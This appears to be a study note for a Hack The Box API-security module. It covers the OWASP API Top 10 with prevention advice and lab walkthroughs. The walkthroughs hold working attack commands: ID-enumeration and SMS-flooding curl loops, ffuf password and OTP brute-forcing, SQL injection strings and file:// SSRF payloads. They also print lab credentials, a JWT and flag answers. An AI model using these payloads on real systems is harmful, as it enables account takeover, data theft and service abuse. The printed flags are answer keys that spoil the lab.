---
tags:
  - CWES
  - HTB
  - cybersecurity
xmind_sheet: "2"
source_file: "CWES.xmind"
---

# API Attacks

## Study Companion

### Prerequisites

REST/API concepts, JSON, tokens, roles, and object identifiers.

### Learning Outcomes

- Inventory endpoints, versions, methods, identities, objects, and business flows.
- Test BOLA, BOPLA, BFLA, authentication, resource controls, SSRF, and unsafe consumption.
- Analyze vulnerability chains and business impact instead of isolated response anomalies.

### Practice Checkpoint

Build an authorization matrix and compare one baseline request across users, roles, methods, and API versions.

### Related Knowledge Map

- [[Maps/API and Application Security|API and Application Security]]
- [[Study Group Guide|CWES Study Group Guide]]

> [!info] Source
> Converted from the CWES XMind mind map. Topic hierarchy, notes, links, and embedded images were preserved.

## Professional Guidance

### Objective
Perform an authorized assessment of REST, SOAP, GraphQL, gRPC, and related API surfaces by mapping endpoints, identities, roles, objects, properties, versions, and upstream dependencies, then validating the OWASP API Security Top 10 risks with controlled, business-aware tests.

### Assessment Workflow
1. Establish scope and API style, then collect Swagger/OpenAPI or other documentation, enumerate versions and endpoint groups, and capture representative requests, response schemas, headers, authentication flows, and server fingerprints.
2. Create test identities for each permitted role, obtain and decode tokens without exposing them, query current-user and current-role endpoints, and build an authorization matrix linking methods and routes to expected object, property, and function permissions.
3. Test Broken Object Level Authorization by replacing user-controlled numeric IDs, GUIDs, and related object keys across read and write operations. Confirm whether ownership or tenant relationships are enforced server-side rather than merely requiring authentication.
4. Assess authentication and recovery controls: password policy, login and OTP/security-question rate limits, response differences, token handling, and reset workflows. Use bounded attempts and approved wordlists; stop before lockout, cost, or availability thresholds are exceeded.
5. Test object-property authorization in both directions. Review responses for excessive PII, secrets, hashes, or internal fields, and submit controlled extra properties to detect mass assignment of roles, fees, prices, balances, file URIs, or other sensitive attributes.
6. Evaluate resource and business-flow controls with agreed limits. Check pagination, upload size/type/content validation, public storage behavior, expensive messaging or reset operations, stock/discount workflows, and repeated requests without causing denial of service or third-party charges.
7. Verify function-level authorization across HTTP methods and privileged routes, then test URL/file-fetching behavior for SSRF or local-file exposure using safe resources. Inspect injection handling, CORS and security headers, verbose errors, deprecated/shadow versions, and unauthenticated legacy endpoints.
8. Review API-to-API trust boundaries for transport security, authentication, validation, rate limiting, and monitoring. Retest chains where one flaw enables another, such as exposed records enabling password recovery, mass assignment enabling SSRF, or old versions bypassing current controls.

### Key Testing Principles
- Authentication is not authorization: verify object ownership, property-level permissions, and function-level roles independently on every relevant method.
- Compare behavior across users, tenants, roles, versions, and endpoint variants; use a documented baseline request before changing one variable at a time.
- Treat client documentation and role labels as hints, not enforcement. Authorization, field allowlists, file restrictions, and URI constraints must be validated at the server.
- Use dedicated DTOs and allowlists as the remediation model for both response minimization and mass-assignment prevention.
- Rate-limit testing must respect agreed request, storage, messaging-cost, and availability ceilings; a safe proof is preferable to exhausting resources.
- Validate uploaded files by size, extension, magic/content, storage location, retrieval behavior, privilege, and malware-scanning controls.
- Inventory every active version and integration. Deprecated, undocumented, and third-party APIs require the same authentication, validation, transport, and monitoring standards as primary endpoints.
- Analyze vulnerability chains and business impact rather than reporting isolated HTTP anomalies.

### Evidence and Reporting
For each finding, retain the endpoint, method, API version, required role, object or property changed, sanitized token context, baseline and modified requests, responses, and rate-limit observations. State whether the issue is BOLA, broken authentication, BOPLA, resource consumption, BFLA, sensitive-flow abuse, SSRF, misconfiguration, inventory failure, or unsafe API consumption; map it to the relevant CWE where appropriate. Quantify affected records or costs conservatively, document chain dependencies, redact PII and credentials, and recommend server-side ownership checks, explicit field allowlists, parameterized queries, strict URI/file controls, bounded resource usage, version retirement, and monitored secure integrations.

<!-- BEGIN XMIND OUTPUTS -->
## XMind Outputs

> [!output] 🟨 Yellow means output
> The source XMind contains **51 yellow/output topics** in this module.

- [[Outputs/Modules/API Attacks Outputs|Open the verified output list]]
<!-- END XMIND OUTPUTS -->

## Complete Technical Reference

## API Building Styles

### Introduction to API Attacks

- Representational State Transfer (REST)
  - <https://roy.gbiv.com/pubs/dissertation/fielding_dissertation.pdf#:~:text=This%20chapter%20introduces%20and%20elaborates%20the%20Representational%20State%20Transfer>
  - clients make requests to resources on a server using standard HTTP methods
    - GET, POST, PUT, DELETE
  - responses are typically serialized
    - JSON or XML
- Simple Object Access Protocol (SOAP)
  - <https://www.w3.org/TR/2000/NOTE-SOAP-20000508/>
  - XML for message exchange between systems.
  - highly standardized and offer comprehensive features for security
  - but they are generally more complex to implement and use than RESTful
- GraphQL
  - <https://graphql.org/>
  - more flexible and efficient way to fetch and update data.
  - use a single endpoint
- gRPC
  - <https://grpc.io/>
  - newer style that uses Protocol Buffers for message serialization,
### OWASP Top 10 API Security Risks

- API1:2023 - Broken Object Level Authorization
  - The API allows authenticated users to access data they are not authorized to view.
- API2:2023 - Broken Authentication
  - The authentication mechanisms of the API can be bypassed or circumvented, allowing unauthorized access.
- API3:2023 - Broken Object Property Level Authorization
  - The API reveals sensitive data to authorized users that they should not access or permits them to manipulate sensitive properties.
- API4:2023 - Unrestricted Resource Consumption
  - The API does not limit the amount of resources users can consume.
- API5:2023 - Broken Function Level Authorization
  - The API allows unauthorized users to perform authorized operations.
- API6:2023 - Unrestricted Access to Sensitive Business Flows
  - The API does not validate requests adequately, allowing attackers to send malicious requests and interact with internal resources.
- API8:2023 - Security Misconfiguration
  - The API suffers from security misconfigurations, including vulnerabilities that lead to Injection Attacks.
- API9:2023 - Improper Inventory Management
  - The API does not properly and securely manage version inventory.
- API10:2023 - Unsafe Consumption of APIs
  - The API consumes another API unsafely, leading to potential security risks.
### Inlanefreight E-Commerce Marketplace

- Swagger API User Interface
  - web API can be accessed via a Swagger UI at the /swagger path
    - <https://swagger.io/tools/swagger-ui/>
- LAB
  - Interact with any endpoint and inspect the response headers; what is the name of the server that the web API uses?
    - Kestrel
  - There is only one endpoint belonging to the Roles group. Submit its path.
    - /api/v1/roles/current-user
## Broken Object Level Authorization (BOLA)

### intro

- also known as Insecure Direct Object Reference (IDOR)
- users to request data or records by sending various parameter
  - Universally Unique Identifiers (UUIDs)
    - also known as Globally Unique Identifiers (GUIDs)
### CWE-639: Authorization Bypass Through User-Controlled Key.

- <https://cwe.mitre.org/data/definitions/639.html>
### Scenario

- authentication
  - account belongs to a Supplier
    - utilize the /api/v1/authentication/suppliers/sign-in endpoint
      - sign in and obtain a JWT using  
        htbpentester1@pentestercompany.com:HTBPentester1
        - copy it from the response and click the Authorize button
          - paste the JWT into the Value text field
- examining the endpoints
  - /api/v1/suppliers/current-user
    - lock
      - utilize the JWT of the currently authenticated user to perform the specified operation
        - "id": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be"
      - retrieve our current user's roles
        - /api/v1/roles/current-user
          - responds with the role SupplierCompanies_GetYearlyReportByID
        - In the Supplier-Companies group,
          - endpoint related to the role SupplierCompanies_GetYearlyReportByID
            - GET parameter: /api/v1/supplier-companies/yearly-reports/{ID}
              - requires
                - SupplierCompanies_GetYearlyReportByID role
                - accepts the ID parameter as an integer and not a Guid
                  - use 1 as the ID
                    - company ID f9e58492-b594-4d82-a4de-16e4f230fce1
                      - not the one we belong to
                  - mass abuse the BOLA vulnerability and fetch the first 20 yearly reports
                    - for ((i=1; i<= 20; i++)); do  
                      curl -s -w "\n" -X 'GET' \  
                      'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \  
                      -H 'accept: application/json' \  
                      -H 'Authorization: Bearer eyJ...' | jq  
                      done
### Prevention

- implement a verification step (at the source code level)
  - authorized users can only access yearly reports
  - comparing the companyID field of the report with the authenticated supplier's companyID
    - Access should be granted only if these values match
### LAB

- Exploit another Broken Object Level Authorization vulnerability and submit the flag.
  - Authorize by sign in with
    - /api/v1/authentication/suppliers/sign-in
      - take the token and authorize
  - look for interesting endpoint
    - /api/v1/suppliers/quarterly-reports/{ID}
      - put our id  
        b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
        - ID must be integer
  - enumerate the first 20 ID
    - for ((i=1; i<= 20; i++)); do curl -s -w "\n" -X 'GET'   'http://154.57.164.78:31958/api/v1/suppliers/quarterly-reports/'$i''   -H 'accept: application/json'   -H 'Authorization: Bearer eyJ...(. .etc JWT token)' | jq; done
      - "id": 8  
        "commentsFromManager": "HTB{e76651e1f516eb5d7260621c26754776}"
## Broken Authentication

### authentication mechanisms can be bypassed or circumvented.

- <https://cwe.mitre.org/data/definitions/307.html>
### Scenario

- /api/v1/authentication/customers/sign-in
  - obtain a JWT and then authenticate
- /api/v1/customers/current-user
  - we get back the information of our currently authenticated user
- /api/v1/roles/current-user
  - reveals that the user is assigned three roles
    - Customers_UpdateByCurrentUser
    - Customers_Get
    - Customers_GetAll
      - allows us to use the /api/v1/customers endpoint
        - returns the records of all customers
          - also suffers from Broken Object Property Level Authorization
            - email
            - phoneNumber
            - birthDate
- /api/v1/customers/current-user PATCH
  - allows us to update our information fields
    - "UpdatedCustomer": {  
      "Name":  
      "string",  
      "Email": "user@example.com"  
      "PhoneNumber":  
      "1234567789",  
      "BirthDate": "2824-06-28",  
      "Password": "string"
      - If we provide a weak password such as 'pass,' the API rejects the update, stating that passwords must be at least six characters long:
        - exposing that the API uses a weak password policy
- perform password brute-forcing against customers using ffuf
  - /api/v1/authentication/customers/sign-in
    - we need to obtain the (fail) message
      - Invalid Credentials
  - three high-value targets (provided by admin pre engagment)
    - OlawaleJones@yandex.com
    - IsabellaRichardson@gmail.com
    - WenSalazar@zoho.com
  - password wordlist
    - <https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt>
  - fuzzing two parameters
    - -w flag of ffuf and assign the keywords EMAIL and PASS
      - ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100
        - [Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]  
          * EMAIL: IsabellaRichardson@gmail.com  
          * PASS: qwerasdfzxcv
  - Applications allow users to reset their passwords by requesting a One Time Password (OTP)
    - Brute-forcing OTPs and Answers of Security Questions
### Prevention

- implement rate-limiting to
  - /api/v1/authentication/customers/sign-in
    - imiting the number of login attempts from a single IP address or user account within a specified time frame.
- API should enforce a robust password policy
  - Minimum password length (e.g., at least 12 characters)
  - Complexity requirements
  - Prohibition of commonly used or easily guessable passwords
  - Enforcement of password history
  - Regular password expiration and mandatory changes
### LAB

- Exploit another Broken Authentication vulnerability to gain unauthorized access to the customer with the email 'MasonJenkins@ymail.com'. Retrieve their payment options data and submit the flag.
  - login as htbpentester and submit the token to Authorize
  - /api/v1/customers
    - {  
      "id": "53428a83-8591-4548-a553-c434ad76a61a",  
      "name": "Mason Jenkins",  
      "email": "MasonJenkins@ymail.com",  
      "phoneNumber": "+44 7451 162707",  
      "birthDate": "1985-09-16"  
      }
  - Ask for restet (Sending OTP)
    - /api/v1/authentication/customers/passwords/resets/email-otps
      - success
  - brute-force OTP
    - ffuf -u http://154.57.164.78:30086/api/v1/authentication/customers/passwords/resets -w otp.txt -X POST -H "Content-type: application/json" -d '{"Email": "MasonJenkins@ymail.com","OTP": "FUZZ","NewPassword": "qwerasdfzxcv"}' -fs 23
      - 5045
  - Sign in as Target
    - /api/v1/authentication/customers/sign-in
      - "Email": "MasonJenkins@ymail.com",  
        "Password": "qwerasdfzxcv"
        - get the token then Authorize
  - Get the Payment Method
    - /api/v1/customers/payment-options/current-user
      - "accountNumber": "HTB{115a6329120e9eff13c4ec6a63343ed1}"
## Broken Object Property Level Authorization

### is a category of vulnerabilities

- Excessive Data Exposure
  - if it reveals sensitive data to authorized users that they are not supposed to access.
- Mass Assignment
  - if it permits authorized users to manipulate sensitive object properties beyond their authorized scope
### Exposure of Sensitive Information Due to Incompatible Policies

- Scenario
  - /api/v1/authentication/customers/sign-in
    - obtain a JWT
  - /api/v1/roles/current-user
    - Suppliers_Get
    - Suppliers_GetAll
  - /api/v1/suppliers
    - fields
      - id
      - companyID
      - name
      - email
      - phoneNumber
    - These sensitive fields should not be exposed to customers
      - circumvent the marketplace entirely and contact suppliers directly to purchase goods
      - benefits suppliers financially by enabling them to generate greater revenues without paying the marketplace fee
  - Prevention
    - /api/v1/suppliers endpoint should only return fields necessary from the customers' perspective
      - rather than exposing the entire domain model used for database interaction.
    - implementing a dedicated request DTO that includes only the fields intended for suppliers to modify.
### Improperly Controlled Modification of Dynamically-Determined Object Attributes

- <https://cwe.mitre.org/data/definitions/915.html>
  - Improperly Controlled Modification of Dynamically-Determined Object Attributes.
- Scenario
  - /api/v1/authentication/suppliers/sign-in to sign in as a Supplier and obtain a JWT
  - /api/v1/roles/current-user
    - SupplierCompanies_Update
    - SupplierCompanies_Get
  - /api/v1/supplier-companies/current-user
    - "name": "PentesterCompany"  
      "isExemptedFromMarketplaceFee": 0
      - which equates to false
  - PATCH
    - /api/v1/supplier-companies
      - requires the SupplierCompanies_Update role
      - allows sending a value for the isExemptedFromMarketplaceFee
        - set it to 1, such that 'PentesterCompany'
          - allows supplier-companies to generate more revenue from all sales performed over the Inlanefreight E-Commerce Marketplace, as they will not be charged a marketplace fee
- Prevention Mass Assignment
  - restrict invokers from updating sensitive fields
    - implementing a dedicated request DTO that includes only the fields intended for suppliers to modify.
### LAB

- Exploit another Excessive Data Exposure vulnerability and submit the flag.
  - /api/v1/authentication/customers/sign-in
    - {  
      "Email": "htbpentester5@hackthebox.com",  
      "Password": "HTBPentester5"  
      }
      - Authorize with JWT
  - /api/v1/roles/current-user
    - "Suppliers_Get",  
      "Suppliers_GetAll",  
      "SupplierCompanies_Get",  
      "SupplierCompanies_GetAll"
  - /api/v1/supplier-companies
    - we can see all suplliers
      - "name": "HTB Academy",  
        "email": "HTB{d759c70b5a9f6a392af78cc1eca9cdf0}"
- Exploit another Mass Assignment vulnerability and submit the flag.
  - /api/v1/authentication/customers/sign-in
    - "Email": "htbpentester7@hackthebox.com",  
      "Password": "HTBPentester7"
  - /api/v1/products
    - we can see all products
      - {  
        "products": [  
        {  
        "id": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",  
        "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",  
        "name": "Smart Home Hub",  
        "price": 25.5,  
        "pngPhotoFileURI": "NotProvidedYet"  
        }
  - /api/v1/roles/current-user
    - "CustomerOrders_GetByID",  
      "CustomerOrders_Create"
    - "CustomerOrderItems_Get"
      - /api/v1/customers/orders/{ID}
      - /api/v1/customers/orders/{ID}/items
    - "CustomerOrderItems_Create"
      - POST /api/v1/customers/orders
        - {  
          "Date": "2026-05-20"  
          }
          - {  
            "id": "e7014e7e-6830-4d00-97ae-95a4d02d73a4"  
            }
      - POST /api/v1/customers/orders/item
        - {  
          "OrderID": "e7014e7e-6830-4d00-97ae-95a4d02d73a4",  
          "OrderItems": [  
          {  
          "ProductID": "a923b706-0aaa-49b2-ad8d-21c97ff6fac7",  
          "Quantity": 1,  
          "NetSum": 0  
          }  
          ]  
          }
          - {  
            "SuccessStatus": true,  
            "Message": "HTB{4d86794f82046e465ca29d91bdbe5bca}"  
            }
## Unrestricted Resource Consumption

### <https://cwe.mitre.org/data/definitions/400.html>

### API is vulnerable if it fails to limit user-initiated requests

- network bandwidth
- CPU
- memory
- storage
### Scenario

- obtain a JWT
- /api/v1/roles/current-user
  - SupplierCompanies_Get
  - SupplierCompanies_UploadCertificateOfIncorporation
    - /api/v1/supplier-companies/certificates-of-incorporation
- /api/v1/supplier-companies/current-user
  - get the supplier-company ID
    - b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
- POST
  - /api/v1/supplier-companies/certificates-of-incorporation
    - allows the staff of a supplier company to upload its certificate
      - as a PDF file
    - create a file containing 30 random megabytes and assign it the .pdf extension
      - dd if=/dev/urandom of=certificateOfIncorporation.pdf bs=1M count=30
        - upload the file
          - successful upload message
            - Additionally, if the endpoint does not implement rate-limiting
              - denial-of-service
    - test whether the endpoint allows uploading files other than PDF files
      - dd if=/dev/urandom of=reverse-shell.exe bs=1M count=10
        - successful
          - notice how the files are stored within wwwroot/SupplierCompaniesCertificatesOfIncorporations
            - social engineer a system administrator to open the file
- Abusing Default Behaviors
  - web API is developed using ASP.NET Core
    - By default, static files in the wwwroot directory are publicly accessible
      - enumerate file names within the this path and wwwroot/
  - try to download the previously uploaded exe file
    - curl -O http://94.237.51.179:51135/SupplierCompaniesCertificatesOfIncorporations/reverse-shell.exe
### Prevention

- implement thorough validation mechanisms
  - size
  - extension and content of uploaded files
    - prevents malicious uploads of executable files (exe, bat, sh) or other potentially harmful file types
- Integrating antivirus scanning tools like ClamAV
  - scanning file contents for known malware signatures before saving them to disk
- ensures that only authenticated users with appropriate privileges can upload files
### LAB

- Exploit another Unrestricted Resource Consumption vulnerability and submit the flag.
  - sign in /supplier/sign-in and obtian JWT
  - /api/v1/authentication/customers/passwords/resets/sms-otps
    - This endpoint sends an OTP via SMS to the Customer's phone number when they want to reset their password.  
      The SMS provider we are working with charges us a significant amount per message. We need to request a discount from them; otherwise, our revenues will decrease.
      - curl -X 'POST' \  
        'http://154.57.164.81:32431/api/v1/authentication/customers/passwords/resets/sms-otps' \  
        -H 'accept: application/json' \  
        -H 'Content-Type: application/json' \  
        -d '{  
        "Email": "htbpentester8@pentestercompany.com"  
        }'
    - create bash loop to consume resources
      - while true; do curl -s -X POST 'http://154.57.164.81:32431/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"Email":"htbpentester8@pentestercompany.com"}'; echo; done
        - {"SuccessStatus":false}  
          {"SuccessStatus":false}  
          {"flag":"HTB{01de742d8cd942ad682aeea9ce3c5428}"}
## Broken Function Level Authorization

### <https://cwe.mitre.org/data/definitions/200.html>

### if it allows unauthorized or unprivileged users to interact with and invoke privileged endpoints

- The difference between BOLA and BFLA
  - BOLA, the user is authorized to interact with the vulnerable endpoint
  - BFLA, the user is not.
### Scenario

- /api/v1/authentication/customer/sign-in to sign in as a customer and obtain a JWT
- /api/v1/products/discounts
  - retrieve all product discounts
  - requires
    - ProductDiscounts_GetAll role
- /api/v1/roles/current-user
  - returns data containing all the discounts for products
    - they did not implement the role-based access control check.
### Prevention

- enforce an authorization check at the source-code level
### LAB

- Exploit another Broken Function Level Authorization vulnerability and submit the flag.
  - /api/v1/authentication/customer/sign-in to sign in as a customer and obtain a JWT
  - /api/v1/roles/current-user
    - User does not have any roles assigned
  - /api/v1/customers/billing-addresses
    - Gets all Customers Billing Addresses
    - "customerID": "9076351f-e6b8-4445-84e3-72800c79dd1d",  
      "city": "Kent",  
      "country": "England",  
      "street": "HTB{1e2095c564baf0d2d316080217040dae}",  
      "postalCode": 19553
## Unrestricted Access to Sensitive Business Flows

### (for example, by buying goods at a discounted price)

### Scenario

- previous section, we exploited a BFLA vulnerability and gained access to product discount data. This data exposure
  - also leads to Unrestricted Access to Sensitive Business Flows
- buy the product with ID a923b706-0aaa-49b2-ad8d-21c97ff6fac7
  - purchase it between 2023-03-15 and 2023-09-15
    - it will be 70% off its original price
- if the endpoint responsible for purchasing products does not implement rate-limiting
  - (i.e., it suffers from Unrestricted Resource Consumption)
    - we can purchase all available stock on the day the discount starts and resell the products later at their original price or at a higher price after the discount ends.
### Prevention

- endpoints exposing critical business operations, such as /api/v1/products/discounts, should implement strict access controls
### LAB

- Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street address where the user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c' lives.
  - /api/v1/customers/billing-addresses
    - "street": "788 Sauchiehall St.",
## Server Side Request Forgery

### <https://cwe.mitre.org/data/definitions/918.html>

### Scenario

- /api/v1/authentication/suppliers/sign-in
- /api/v1/roles/current-user
  - SupplierCompanies_Update
  - SupplierCompanies_UploadCertificateOfIncorporation
- /api/v1/supplier-companies/current-user
  - b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
- endpoints related to these roles
  - /api/v1/supplier-companies/certificates-of-incorporation
    - POST
      - upload its certificate of incorporation as a PDF file
      - the response contains three fields
        - most interesting being the value of fileURI
  - /api/v1/supplier-companies
    - PATCH
      - allows modifying the value of the CertificateOfIncorporationPDFFileURI field
        - this endpoint is vulnerable to Improperly Controlled Modification of Dynamically-Determined Object Attributes
          - the value of this field should only be set by
            - /api/v1/supplier-companies/certificates-of-incorporation
  - /api/v1/supplier-companies/{ID}/certificates-of-incorporation
    - POST
- update the CertificateOfIncorporationPDFFileURI field to point to the /etc/passwd file
  - /api/v1/supplier-companies
    - PATCH
- invoke the /api/v1/supplier-companies/{ID}/certificates-of-incorporation
  - GET
    - /etc/passwd, as base64
### Prevention

- must strictly prohibit file URIs that point to local resources
  - /api/v1/supplier-companies/certificates-of-incorporation POST and /api/v1/supplier-companies PATCH
- URIs only point to permissible local resources is crucial
  - wwwroot/SupplierCompaniesCertificatesOfIncorporations/ folder
- ensures that only certificates of incorporation are accessible and that local resources or files outside this directory are never exposed
### LAB

- Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'.
  - /api/v1/roles/current-user
    - "SupplierCompanies_Update",  
      "SupplierCompanies_UploadCertificateOfIncorporation",  
      "Products_CreateByCurrentUser",  
      "Products_Update",  
      "Products_UploadPhoto"
  - /api/v1/products/current-user
    - POST
      - {  
        "NewProduct": {  
        "Name": "rayanflag2",  
        "Price": 7,  
        "PNGPhotoFileURI": "not"  
        }  
        }
        - {  
          "successStatus": true,  
          "productID": "a919add6-7b47-4391-ba50-c464a1b295c1"  
          }
          - we create product
  - /api/v1/products/current-supplier-company
    - we can see all the products we made
      - "id": "47723251-c9e1-4eca-ad84-18c4cd971e82",  
        "supplierID": "5d489453-3538-4973-9479-2c37b2a5db73",  
        "name": "rayanflag2",  
        "price": 7,  
        "pngPhotoFileURI": ""
  - /api/v1/products/current-user
    - PATCH
      - {  
        "UpdatedProduct": {  
        "ProductID": "a919add6-7b47-4391-ba50-c464a1b295c1",  
        "Name": "rayanflag2",  
        "Price": 7,  
        "PNGPhotoFileURI": "file:///etc/flag.conf"  
        }  
        }
        - {  
          "SuccessStatus": true  
          }
  - /api/v1/products/a919add6-7b47-4391-ba50-c464a1b295c1/photo
    - a919add6-7b47-4391-ba50-c464a1b295c1
      - {  
        "successStatus": true,  
        "base64Data": "SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo="  
        }
        - decode base64
          - HTB{3c94232c4f0b0a544ae4024833eef0b3}
## Security Misconfiguration

### Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

- <https://cwe.mitre.org/data/definitions/89.html>
### Scenario

- /api/v1/authentication/suppliers/sign-in
  - obtaining a JWT
- /api/v1/roles/current-user
  - Products_GetProductsTotalCountByNameSubstring
- only endpoint related to that role
  - /api/v1/products/{Name}/count
    - returns the total count of products containing a user-provided substring in their name
      - containing a user-provided substring in their name
    - laptop
      - 18 matching
        - laptop'
          - returns an error message
            - indicating a potential vulnerability to SQL injection
- attempt to retrieve the count of all records in the Products table
  - laptop' OR 1=1 --
    - 720 products in the table
### HTTP Headers

- suffer from security misconfigurations
  - if they do not use proper HTTP Security Response Headers
    - <https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html>
- suppose
  - API does not set a secure Access-Control-Allow-Origin
    - it can be exposed to security risks, most notably, Cross-Site Request Forgery (CSRF)
### Prevention

- /api/v1/products/{Name}/count endpoint should utilize parameterized queries
  - Object Relational Mapper (ORM)
    - <https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping>
- HTTP headers
  - <https://github.com/OWASP/www-project-secure-headers>
### LAB

- Exploit another Security Misconfiguration and provide the total count of records within the target table.
  - /api/v1/authentication/customers/sign-in
    - obtain JWT
  - /api/v1/roles/current-user
    - "Suppliers_GetTotalCountBySupplierNameSubstring"
  - /api/v1/suppliers/{name}/count
    - lap' OR 1=1 --
      - 151
- Submit the header and its value that expose another Security Misconfiguration in the API.
  - /api/v1/authentication/customers/sign-in
    - access-control-allow-origin: *
## Improper Inventory Management

### including

- inadequate versioning
- outdated or incompatible API versions remaining accessible
### Scenario

- we have primarily interacted with v1
  - Swagger UI's drop-down list for 'Select a definition',
    - we discover the existence of an additional version, v0
- v0
  - inspecting the endpoints
    - none of them display a 'lock' icon
      - do not require any form of authentication
  - /api/v0/customers/deleted
    - exposing deleted customer data, including sensitive password hashes
      - Excessive Data Exposure
      - we could attempt password cracking
        - this could potentially compromise active accounts
          - if the same customers re-registered using the same password.
### Prevention

- should either remove v0 entirely
- or, at a minimum, restrict access exclusively for local development
### LAB

- Exploit the Improper Inventory Management vulnerability and submit the value of the 'Email' field from the deleted Supplier Company with the ID 'c250cb38-96e3-4ccf-9df2-0a03146a2d0b'.
  - HTB{43c2754afea99eba70fb2c8dc443c660}
## Unsafe Consumption of APIs

### <https://cwe.mitre.org/data/definitions/1357.html>

### APIs frequently interact with other APIs to exchange data

- introduces significant security risks if not managed properly
### Developers may blindly trust data received from third-party APIs

- especially when provided by reputable organizations, leading to relaxed security measures
### Several critical vulnerabilities can arise from API-to-API communication

- Insecure Data Transmission
  - APIs communicating over unencrypted channels
- Inadequate Data Validation
  - Failing to properly validate and sanitize data received from external APIs
- Weak Authentication
  - Neglecting to implement robust authentication methods when communicating with other APIs
- Insufficient Rate-Limiting
  - An API can overwhelm another API by sending a continuous surge of requests
    - leading to denial-of-service
- Inadequate Monitoring
  - Insufficient monitoring of API-to-API interactions can make it difficult to detect and respond to security incidents promptly.
### Prevention

- Secure Data Transmission
  - Use encrypted channels for data transmission
- Adequate Data Validation
  - Ensure proper validation and sanitization of data received from external APIs
- Robust Authentication
  - Employ secure authentication methods when communicating with other APIs
- Sufficient Rate-Limiting
  - Implement rate-limiting mechanisms to prevent an API from overwhelming another API
- Adequate Monitoring
  - Implement robust monitoring of API-to-API interactions
### LAB

- If v1 of Inlanefreight's E-Commerce Marketplace accepted data from the '/api/v0/suppliers/deleted' endpoint unsafely, what would the password hash of 'Yara MacDonald' be in v1?
  - v0
    - 006006C3167E90A7575A12E474218D86
## Skills Assessment

### Submit the contents of the flag at '/flag.txt'.

- /api/v2/authentication/customers/sign-in
  - {  
    "Email": "htbpentester@hackthebox.com",  
    "Password": "HTBPentester"  
    }
    - obtain JWT
      - eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3Nzk4MjAyMTAsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.oqITCUVWWAaZf0p_ED2J_u2dPiLRxXWol5pdCOj1k_K5GmTDwMD7BtsZoPDRhRcrrjY1HrJk-zTd_SbN_vrmzw
- /api/v2/roles/current-user
  - {  
    "roles": [  
    "Suppliers_Get",  
    "Suppliers_GetAll"  
    ]  
    }
- /api/v2/suppliers/current-user/cv
  - dd if=/dev/urandom of=cv.pdf bs=1K count=50
    - even adding Magic Byte %PDF-
      - {  
        "errorMessage": "Could not upload the CV, its either malicious or very big in size"  
        }
- /api/v2/suppliers
  - Role(s) required: Suppliers_GetAll
    - {  
      "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",  
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",  
      "name": "Patrick Howard",  
      "email": "P.Howard1536@globalsolutions.com",  
      "securityQuestion": "What is your favorite color?",  
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"  
      },  
      {  
      "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",  
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",  
      "name": "Luca Walker",  
      "email": "L.Walker1872@globalsolutions.com",  
      "securityQuestion": "What is your favorite color?",  
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"  
      },  
      {  
      "id": "fafebea0-8894-4744-b7de-6c66d5749740",  
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",  
      "name": "Tucker Harris",  
      "email": "T.Harris1814@globalsolutions.com",  
      "securityQuestion": "What is your favorite color?",  
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"  
      },  
      {  
      "id": "36f17195-395f-443e-93a4-8ceee81c6106",  
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",  
      "name": "Brandon Rogers",  
      "email": "B.Rogers1535@globalsolutions.com",  
      "securityQuestion": "What is your favorite color?",  
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"  
      },  
      {  
      "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",  
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",  
      "name": "Mason Alexander",  
      "email": "M.Alexander1650@globalsolutions.com",  
      "securityQuestion": "What is your favorite color?",  
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"  
      }
- /api/v2/authentication/suppliers/passwords/resets/security-question-answers
  - brute force users with the security questions
    - wordlist
      - https://github.com/imsky/wordlists/blob/master/adjectives/colors.txt
    - Fuzz (intruder)
      - {  
        "SupplierEmail": "B.Rogers1535@globalsolutions.com",  
